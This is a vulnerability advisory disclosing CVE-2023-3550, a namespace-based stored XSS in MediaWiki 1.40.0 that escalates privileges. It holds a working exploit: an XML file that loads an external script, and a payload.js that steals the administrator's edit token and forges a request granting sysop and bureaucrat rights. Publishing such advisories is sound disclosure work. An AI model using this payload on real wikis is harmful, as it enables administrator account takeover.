---
slug: advisories/blondie/
title: Stored XSS leads to privilege escalation in MediaWiki v1.40.0
authors: Carlos Bello
writer: cbello
codename: blondie
product: MediaWiki
date: 2023-07-17 12:00 COT
cveid: CVE-2023-3550
severity: 7.3
description: Stored XSS leads to privilege escalation in MediaWiki v1.40.0
keywords: Fluid Attacks, Security, Vulnerabilities, Media Wiki, Stored XSS, CSRF, Privilege Escalation
banner: advisories-bg
advise: yes
template: maskedAdvisory
encrypted: yes
---

## Summary

|                       |                                                                    |
| --------------------- | -------------------------------------------------------------------|
| **Name**              | Stored XSS leads to privilege escalation in MediaWiki v1.40.0      |
| **Code name**         | [Blondie](https://en.wikipedia.org/wiki/Blondie_(band))            |
| **Product**           | product: MediaWiki                                                 |
| **Affected versions** | Version 1.40.0                                                     |
| **State**             | Private                                                            |
| **Release date**      | 2023-07-17                                                         |

## Vulnerability

|                       |                                                                                                                             |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------|
| **Kind**              | Stored cross-site scripting                                                                                                 |
| **Rule**              | [010. Stored cross-site scripting](https://docs.fluidattacks.com/criteria/vulnerabilities/010)                              |
| **Remote**            | Yes                                                                                                                         |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N                                                                                |
| **CVSSv3 Base Score** | 7.3                                                                                                                         |
| **Exploit available** | Yes                                                                                                                         |
| **CVE ID(s)**         | [CVE-2023-3550](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-3550)                                               |

## Description

Mediawiki v1.40.0 does not validate namespaces used in XML files.
Therefore, if the instance administrator allows XML file uploads,
a remote attacker with a low-privileged user account can use this
exploit to become an administrator by sending a malicious link to
the instance administrator.

## Vulnerability

In Mediawiki v1.40.0, an authenticated remote attacker can escalate
his privileges through a Stored XSS. Thanks to this, we can perform
a CSRF on an administrative account to escalate the privileges of an
arbitrary account.

The Stored XSS is caused by MediaWiki v1.40.0 not validating the
namespaces used in XML files. Thanks to this we can bypass the script
detection security controls.

### Exploit failed

Here our exploit attempt fails, thanks to the script being detected
correctly:

![exploit-failed](https://user-images.githubusercontent.com/51862990/251885755-675ccfe7-825d-45af-924b-868cf5b38be2.png)

### Exploit Success

Here the exploit worked, since we bypassed the script detection controls
by using a namespace:

![exploit-success](https://user-images.githubusercontent.com/51862990/251885730-084c14e6-fc19-4a26-aa7a-564f1331070b.png)

## Exploit

To exploit the vulnerability we built an XML file that uses a namespace to
bypass script detection protection. This script loads an external script which
seeks to escalate the privileges of an account when the administrator accesses
the malicious XML link through a CSRF.

### exploit.xml

```xml
<x:script xmlns:x="http://www.w3.org/1999/xhtml" src="http://localhost:7777/payload.js">
</x:script>
```

### payload.js

```js
var token = "";

fetch('http://localhost:8080/mediawiki-1.40.0/index.php?title=Special%3AUserRights&user=Hacker', {
  credentials: 'include'
})
.then(response => response.text())
.then(html => {
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');
    token = doc.getElementsByName('wpEditToken')[0].value;

    // Llamar a la segunda solicitud POST después de obtener el token
    return fetch('http://localhost:8080/mediawiki-1.40.0/index.php/Special:UserRights', {
        method: 'POST',
        credentials: 'include',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'user=Hacker&wpEditToken=' + encodeURIComponent(token) + '&conflictcheck-originalgroups=&wpExpiry-bot=infinite&wpExpiry-bot-other=&wpGroup-sysop=1&wpExpiry-sysop=infinite&wpExpiry-sysop-other=&wpGroup-interface-admin=1&wpExpiry-interface-admin=infinite&wpExpiry-interface-admin-other=&wpGroup-bureaucrat=1&wpExpiry-bureaucrat=infinite&wpExpiry-bureaucrat-other=&wpExpiry-suppress=infinite&wpExpiry-suppress-other=&user-reason=&saveusergroups=Save+user+groups'
    });
})
.then(response => {
    console.log('Respuesta:', response);
})
.catch(error => {
    console.error('Error:', error);
});
```

## Evidence of exploitation

Here is a step-by-step description of how to exploit this vulnerability.
Basically what will be shown below is how a user with low privileges can
increase his privileges by sending a malicious link to the instance administrator.

<iframe src="https://www.veed.io/embed/b8d55a6b-7b89-42ba-8405-6d2e9977479e"
width="835" height="504" frameborder="0" title="XSS-MediaWikiv1.40.0-Part1"
webkitallowfullscreen mozallowfullscreen allowfullscreen controls>
</iframe>

<iframe src="https://www.veed.io/embed/c217726e-cfbf-4d8b-9453-c8d66946cc12"
width="835" height="504" frameborder="0" title="XSS-MediaWikiv1.40.0-Part2"
webkitallowfullscreen mozallowfullscreen allowfullscreen controls>
</iframe>

## Our security policy

We have reserved the CVE-2023-3550 to refer to these issues from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: MediaWiki 1.40.0

* Operating System: MacOS

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://www.mediawiki.org/wiki/MediaWiki>

## Timeline

<time-lapse
  discovered="2023-07-07"
  contacted="2023-07-07"
  replied="2023-07-07"
  confirmed=""
  patched=""
  disclosure="2023-07-17">
</time-lapse>
